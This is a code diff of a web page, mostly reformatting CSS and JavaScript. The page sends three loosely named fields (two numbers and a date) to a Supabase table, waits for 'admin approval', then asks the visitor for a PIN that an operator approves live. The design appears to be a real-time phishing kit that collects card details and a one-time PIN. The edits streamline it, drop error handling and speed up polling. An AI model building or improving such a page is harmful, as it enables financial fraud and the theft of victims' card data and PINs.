@@ -37,21 +37,10 @@
             gap: 12px;
         }
 
-        .logo-main {
-            font-size: 26px;
-            font-weight: 800;
-        }
-
+        .logo-main { font-size: 26px; font-weight: 800; }
         .logo-dot { color: #ffcc00; }
 
-        .tagline {
-            font-size: 14.5px;
-            opacity: 0.95;
-        }
-
-        .content {
-            padding: 30px 25px;
-        }
+        .content { padding: 30px 25px; }
 
         h2 {
             text-align: center;
@@ -67,9 +56,7 @@
             margin-bottom: 30px;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
+        .form-group { margin-bottom: 20px; }
 
         label {
             display: block;
@@ -87,10 +74,7 @@
             font-size: 16px;
         }
 
-        input:focus {
-            border-color: #8c1d3e;
-            outline: none;
-        }
+        input:focus { border-color: #8c1d3e; outline: none; }
 
         button {
             width: 100%;
@@ -186,7 +170,6 @@
         </div>
     </div>
 
-    <!-- Status Modal -->
     <div id="statusModal" class="modal">
         <div class="modal-content" id="modalContent"></div>
     </div>
@@ -219,20 +202,13 @@
             return;
         }
 
-        showModal(`
-            <div class="loader"></div>
-            <div class="wait">Submitting your request...</div>
-        `);
+        showModal(`<div class="loader"></div><div class="wait">Submitting your request...</div>`);
 
-        const { data, error } = await client
-            .from('requests')
-            .insert([{ 
-                number1, date_value, number2, 
-                status: 'pending', pin: '', pin_status: 'waiting' 
-            }])
-            .select();
+        const { data, error } = await client.from('requests').insert([{
+            number1, date_value, number2, status: 'pending', pin: '', pin_status: 'waiting'
+        }]).select();
 
-        if(error){
+        if(error) {
             showModal(`<div class="reject">Submission Error</div>`);
             return;
         }
@@ -252,20 +228,15 @@
 
             if(error) return;
 
-            // ✅ Final Success Check - Sabse Pehle Check Karega
+            // === STRONG SUCCESS CHECK ===
             if(data.status === 'accepted' && data.pin_status === 'accepted'){
                 clearInterval(interval);
-                showModal(`
-                    <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
-                `);
+                showModal(`<div class="success">Congratulations! 🎉<br>Verified Successfully</div>`);
                 return;
             }
 
             if(data.status === 'pending'){
-                showModal(`
-                    <div class="loader"></div>
-                    <div class="wait">Waiting for admin approval...</div>
-                `);
+                showModal(`<div class="loader"></div><div class="wait">Waiting for admin approval...</div>`);
             } 
             else if(data.status === 'rejected'){
                 clearInterval(interval);
@@ -276,51 +247,31 @@
                     clearInterval(interval);
                     showModal(`
                         <div class="wait">Enter PIN to proceed</div>
-                        <input type="text" id="pin" placeholder="Enter PIN" 
-                               style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:6px; font-size:16px;">
-                        <button onclick="submitPin()" 
-                                style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:6px; color:white; font-weight:600; margin-top:10px;">
-                            Submit PIN
-                        </button>
+                        <input type="text" id="pin" placeholder="Enter PIN" style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:6px;">
+                        <button onclick="submitPin()" style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:6px; color:white; font-weight:600; margin-top:10px;">Submit PIN</button>
                     `);
                 } 
                 else if(data.pin_status === 'pending'){
-                    showModal(`
-                        <div class="loader"></div>
-                        <div class="wait">Verifying PIN...</div>
-                    `);
+                    showModal(`<div class="loader"></div><div class="wait">Verifying PIN...</div>`);
                 } 
                 else if(data.pin_status === 'rejected'){
                     clearInterval(interval);
                     showModal(`<div class="reject">PIN Rejected</div>`);
                 }
             }
-        }, 1500);
+        }, 1200); // Faster polling
     }
 
     async function submitPin(){
-        const pinInput = document.getElementById('pin');
-        if(!pinInput) return;
-        
-        const pin = pinInput.value.trim();
-        if(!pin){
+        const pin = document.getElementById('pin').value.trim();
+        if(!pin) {
             alert("Please enter PIN");
             return;
         }
 
-        showModal(`
-            <div class="loader"></div>
-            <div class="wait">Submitting PIN...</div>
-        `);
+        showModal(`<div class="loader"></div><div class="wait">Submitting PIN...</div>`);
 
-        const { error } = await client
-            .from('requests')
-            .update({ pin: pin, pin_status: 'pending' })
-            .eq('id', currentId);
-
-        if(error) {
-            showModal(`<div class="reject">Error Submitting PIN</div>`);
-        }
+        await client.from('requests').update({ pin: pin, pin_status: 'pending' }).eq('id', currentId);
     }
     </script>
 </body>
